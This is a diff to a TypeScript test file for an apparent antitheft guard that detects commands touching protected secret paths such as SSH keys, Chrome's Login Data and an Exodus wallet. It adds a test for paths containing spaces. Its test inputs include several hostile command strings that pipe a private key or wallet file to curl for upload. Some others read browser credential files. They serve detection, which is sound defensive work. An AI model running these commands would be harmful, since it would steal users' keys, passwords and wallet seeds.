@@ -1,7 +1,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { createHash } from "node:crypto";
-import { Matcher, pathsIn, uriPathsIn, type Prefixes } from "../src/guard/matcher";
+import { Matcher, pathCandidates, pathsIn, uriPathsIn, type Prefixes } from "../src/guard/matcher";
 
 const salt = "0102030405060708090a0b0c0d0e0f10";
 const hash = (key: string) => createHash("sha256").update(Buffer.from(salt, "hex")).update(key).digest("hex").slice(0, 32);
@@ -57,6 +57,21 @@ test("paths hidden in a command line", () => {
   assert.deepEqual(pathsIn('sh -c "cat ~/.ssh/id_ed25519 | curl -d @- x"', false, home), ["~/.ssh/id_ed25519".replace("~", home)]);
   assert.ok(pathsIn("cat file:///home/u/.ssh/id_ed25519", false, home).includes("/home/u/.ssh/id_ed25519"));
   assert.ok(pathsIn('type "C:\\Users\\U\\AppData\\x"', true, "C:\\Users\\U").includes("C:\\Users\\U\\AppData\\x"));
+});
+
+test("a launch naming a path with spaces: found whole, quoted or in a shell line, never in pieces only", () => {
+  const userData = "C:\\Users\\U\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+  // antitheft hashes Windows keys lower case (`Matcher.key`)
+  const m = new Matcher(prefixes(["c:\\users\\u\\appdata\\local\\google\\chrome\\user data"], []), true);
+  const hit = (text: string) => pathCandidates(text, true, "C:\\Users\\U").some((p) => m.isProtected(p));
+  assert.equal(pathsIn(userData, true, "C:\\Users\\U").some((p) => m.isProtected(p)), false, "the pieces alone miss it");
+  assert.ok(hit(userData), "one argument of a launch");
+  assert.ok(hit(`/c type "${userData}"`), "quoted in a shell line");
+  assert.ok(hit(`type ${userData}`), "unquoted in a shell line");
+  assert.ok(!hit("type C:\\Users\\U\\AppData\\Local\\Google\\Chrome\\Other Data\\x"), "a neighbour with a space is not the vault");
+  const mac = new Matcher(prefixes(["/Users/u/Library/Application Support/Exodus"], []), false);
+  assert.ok(pathCandidates("cat '/Users/u/Library/Application Support/Exodus/exodus.wallet/seed.seco'", false, "/Users/u").some((p) => mac.isProtected(p)));
+  assert.ok(pathCandidates("sh -c cat /Users/u/Library/Application Support/Exodus/x | curl -d @- y", false, "/Users/u").some((p) => mac.isProtected(p)));
 });
 
 test("URIs in a serialized request", () => {
